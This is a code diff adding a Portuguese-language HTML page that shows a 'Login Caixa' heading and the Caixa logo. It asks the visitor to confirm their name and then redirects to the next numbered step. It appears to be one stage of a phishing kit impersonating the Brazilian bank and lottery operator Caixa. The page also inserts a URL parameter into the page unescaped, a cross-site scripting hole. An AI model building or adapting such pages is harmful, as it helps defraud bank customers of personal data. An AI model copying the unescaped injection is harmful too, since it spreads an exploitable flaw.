@@ -1,0 +1,161 @@
+﻿<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loterias Online</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="../css2-1.css?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&amp;display=swap" rel="stylesheet">
+
+    <style>
+        @font-face {
+            font-family: 'Futura-Book';
+            src: url('fonts/Futura-Book.eot');
+            src: url('fonts/Futura-Book.eot') format('embedded-opentype'),
+                url('fonts/Futura-Book.woff2') format('woff2'),
+                url('fonts/Futura-Book.woff') format('woff'),
+                url('fonts/Futura-Book.ttf') format('truetype'),
+                url('images/Futura-Book.svg') format('svg');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        body { font-family: 'Futura-Book' !important; }
+
+        .container-bg {
+            background: linear-gradient(45deg, #00a9ad, #005ca9); 
+            background-size: 100%;
+            background-repeat: no-repeat;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container-principal {
+            height: auto;
+            margin: 0 auto;
+            background-color: white;
+            width: 450px;
+            max-width: 95%;
+            color: black;
+            background-color: #fff !important;
+            border-radius: .4rem;
+            box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
+            padding: 3rem 4rem;
+        }
+
+        @media (max-width: 576px) {
+            .container-principal { padding: 3rem 2rem !important; } 
+        }
+
+        .container-principal img { width: 150px; }
+
+        .container-principal h1 {
+            color: #0070ae;
+            font-size: 1rem;
+            margin-top: .4rem;
+        }
+
+        .container-principal h2 {
+            color: #4d7880;
+            font-size: 1.1rem;
+            margin-top: 1rem;
+            margin-bottom: 2.2rem;
+            width: 100%;
+            text-align: justify;
+        }
+
+        .btn {
+            background: #FF7F00;
+            color: white;
+            width: 100%;
+            padding: 10px;
+            border: none;
+            font-size: 1rem;
+            border-radius: 4px;
+        }
+
+        .btn:hover {
+            background: #FF5722;
+        }
+    </style>
+</head>
+
+<body>
+<div class="container-bg">
+    <div class="container-principal d-flex justify-content-center align-items-center flex-column">
+        <img src="images/logo-caixa.webp" alt="">
+        <h1>Login Caixa</h1>
+        <h2>Para continuar, confirme se o seu nome está correto.</h2>
+
+        <div class="confirmation" id="confirmationData"></div>
+
+        <button class="btn" id="confirmBtn">Confirmar</button>
+    </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    // 1) Tenta recuperar pela URL
+    const params = new URLSearchParams(window.location.search);
+    let nome = params.get('nome');
+
+    // 2) Fallback: sessionStorage
+    if (!nome || !nome.trim()) {
+        const stored = sessionStorage.getItem('nomeTitular');
+        if (stored && stored.trim()) nome = stored.trim();
+    }
+
+    // 3) Render com quebra automática no mobile (sem "...")
+    const confirmation = document.getElementById('confirmationData');
+    if (nome && confirmation) {
+        confirmation.innerHTML = `
+          <div style="
+              display:flex;
+              align-items:flex-start;
+              width:100%;
+              margin-bottom:1rem;
+              font-size:1.05rem;
+              gap:6px;
+              flex-wrap:wrap;
+          ">
+            <span style="
+              margin:0;
+              white-space:nowrap;
+              font-size:1.1rem;
+              color:#4d7880;
+            ">Nome:</span>
+
+            <span style="
+              font-weight:600;
+              color:#4d7880;
+              white-space:normal;
+              word-break:break-word;
+              flex:1;
+            ">${nome}</span>
+
+            <input type="radio" name="confirmaNome" checked>
+          </div>
+        `;
+    } else if (confirmation) {
+        confirmation.innerHTML = '<p>Não foi possível recuperar o nome.</p>';
+    }
+
+    // 4) Botão confirmar
+    const btn = document.getElementById('confirmBtn');
+    if (btn) {
+        btn.addEventListener('click', function () {
+            if (nome && nome.trim()) {
+                sessionStorage.setItem('nomeTitular', nome.trim());
+            }
+            window.location.href = "../3/";
+        });
+    }
+});
+</script>
+</body>
+</html>
